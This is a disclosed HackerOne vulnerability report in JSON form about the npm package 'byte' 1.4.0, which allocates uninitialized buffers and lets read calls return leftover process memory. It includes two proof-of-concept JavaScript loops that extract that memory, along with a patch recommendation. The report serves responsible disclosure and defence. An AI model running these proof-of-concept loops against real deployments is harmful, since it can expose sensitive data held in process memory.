{
  "id": 330351,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzAzNTE=",
  "url": "https://hackerone.com/reports/330351",
  "title": "`byte` allocates uninitialized buffers and reads data from them past the initialized length",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-03-27T13:37:06.258Z",
  "submitted_at": "2018-03-27T13:37:06.258Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "chalker",
    "url": "/chalker",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-05-11T20:25:26.435Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-05-11T20:25:16.335Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report a memory exposure vulnerbaility in `byte`\nIt allows to extract process memory using Buffers in some cases.\n\n# Module\n\n**module name:** `byte`\n**version:** 1.4.0\n**npm page:** `https://www.npmjs.com/package/byte`\n\n## Module Description\n\n> Input Buffer and Output Buffer, just like Java ByteBuffer.\n\n## Module Stats\n\n705 downloads in the last day\n3 836 downloads in the last week\n14 813 downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\n`byte` allocates uninitialized buffers on all Node.js versions, even on the ones that zero-full `new Buffer()` by default, as it uses `.allocUnsafe()`. It provides an API for writing data and an API for reading data from the buffer, but the internal buffer is not zero-filled and the API for reading does not validate that the memory being read was ever initialized.\n\nI also don't think this corresponds to behavior  of the Java ByteBuffer â€” that one is zero-filled afaik.\n\n## Steps To Reproduce:\n\n```js\nvar ByteBuffer = require('byte');\nfor (let k = 0; k < 1e4; k++) {\n  var bb = new ByteBuffer();\n  for (let i = 0; i < 180; i++) {\n    bb.putString('ok');\n  }\n  const s = bb.getString(1000);\n  if (s.includes(' {')) {\n    console.log(s);\n    console.log('Finished at attempt: ' + k);\n    break;\n  }\n}\n```\n\n```js\nvar ByteBuffer = require('byte');\nfor (let k = 0; k < 1e4; k++) {\n  var bb = ByteBuffer.allocate(50);\n  const twos = Buffer.alloc(10, 2);\n  for (let i = 0; i < 7; i++) bb.put(twos, 10);\n  const s = bb.get(0, 100);\n  if (s.includes(' {')) {\n    console.log(s.toString('utf-8'));\n    console.log('Finished at attempt: ' + k);\n    break;\n  }\n}\n```\n\n## Patch\n\nReplace all `Buffer(num)` and `Buffer.allocUnsafe(num)` usage with `Buffer.alloc(num)` and use a polyfill, e.g. [safer-buffer](https://www.npmjs.com/package/safer-buffer) or [buffer-alloc](https://www.npmjs.com/package/buffer-alloc).\n\n## Supporting Material/References:\n\n- OS: Arch Linux current\n- Node.js 9.9.0\n- npm 5.8.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nRead process memory containing sensitive information.",
  "weakness": {
    "id": 8,
    "name": "Out-of-bounds Read"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-06-10T20:25:16.409Z",
  "allow_singular_disclosure_after": -179166972.85351023,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "kapytein",
    "bl4de",
    "0x08",
    "nims_0110"
  ],
  "severity": {
    "rating": "medium",
    "score": 5.2,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "physical",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 9719,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "byte",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
